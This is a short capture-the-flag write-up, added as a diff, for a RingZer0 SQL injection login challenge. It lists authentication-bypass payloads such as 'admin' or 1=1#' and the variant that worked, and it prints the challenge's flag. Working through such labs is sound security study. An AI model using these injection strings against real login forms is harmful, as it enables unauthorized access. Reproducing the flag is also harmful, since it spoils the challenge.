@@ -1,0 +1,16 @@
+challenge link : https://ringzer0team.com/challenges/3
+
+in this challenge we know that there are sql injection but we need a playload to get information about password of admin "password is flag"
+
+se i tried this palyloads
+admin' or 1 
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1 
+and all between 2 error user is now correct or spicail char 
+so  i  try  , 
+admin' or 1 or'
+to escape this security level "D and i get the flag
+FLAG-4f885o1dal0q1huj6eaxuatcvn
+
+enjoy with capture theflag :V
